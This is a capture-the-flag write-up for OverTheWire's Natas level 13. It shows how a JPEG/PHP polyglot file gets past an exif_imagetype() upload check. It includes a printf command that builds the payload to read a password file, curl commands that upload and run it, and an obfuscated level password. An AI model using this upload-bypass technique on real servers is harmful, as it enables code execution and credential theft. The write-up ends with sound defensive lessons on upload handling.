# Write-up: Natas 13 → 14  
**Date:** 2025-12-13  

## Obfuscated password (ROT13)  
`m3HLpe4i4hOcrK8s7RMoZUymX4HE2KgD`

---

## OBJECTIVE

> This level builds directly on Natas 12. The server now validates file **content**, not just the file extension. Our goal is to bypass this validation and upload a PHP file that gets executed. Clicking “View sourcecode” reveals logic similar to Natas 12, with one critical additional check.

Relevant server-side logic (simplified):

    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
    }

---

## PURPOSE

This level introduces **magic-byte image validation** using `exif_imagetype()`, which is stronger than simple filename checks but still insufficient on its own.

Protections in place:
- Uploaded file must be **≤ 1 KB**
- Uploaded file must pass `exif_imagetype()` (i.e., begin with valid image magic bytes)
- The stored filename extension is still derived from **user-controlled POST data**
- The upload directory remains **web-accessible and executable**

Weaknesses:
- `exif_imagetype()` only inspects the **first few bytes** of the file
- The server still trusts the user-controlled `filename` parameter to determine the stored extension
- PHP execution is still enabled in the upload directory

This allows a **polyglot file attack**: a file that is both a valid image and valid PHP.

---

## SOLUTION

We create a file that satisfies **both** requirements:

1. Begins with valid JPEG magic bytes (to pass `exif_imagetype()`)
2. Contains PHP code that executes when the file is interpreted as `.php`

### Building the payload

Create a file named `shell.php.jpg` whose contents begin with a valid JPEG header, followed by PHP code:

    printf "\xFF\xD8\xFF\n<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>" > shell.php.jpg

Explanation:
- `FF D8 FF` is the JPEG magic header
- PHP ignores binary data before `<?php`
- `exif_imagetype()` returns true
- The PHP payload executes if the file is served as `.php`

---

## UPLOAD AND EXECUTE

Upload the file while **forcing the final extension to `.php`** via the `filename` POST parameter (same vulnerability as Natas 12):

    curl -u natas13:<password> \
      -F "uploadedfile=@shell.php.jpg" \
      -F "filename=shell.php" \
      http://natas13.natas.labs.overthewire.org/

The server responds with a randomized filename such as:

    upload/ab3k9s7d2q.php

Trigger execution:

    curl -u natas13:<password> \
    http://natas13.natas.labs.overthewire.org/upload/ab3k9s7d2q.php

This prints the password for **Natas 14**.

---

## TAKEAWAYS

- Magic-byte validation alone does **not** prevent malicious uploads
- `exif_imagetype()` only verifies the file header, not full content
- User-controlled filenames must never determine executable extensions
- Upload directories should **never allow script execution**
- Secure upload handling requires:
  - strict server-side extension enforcement
  - MIME and content validation
  - execution disabled on upload paths

---

Writeup author: **Jeremy Ray Jewell**  
GitHub: https://github.com/jeremyrayjewell  
LinkedIn: https://www.linkedin.com/in/jeremyrayjewell
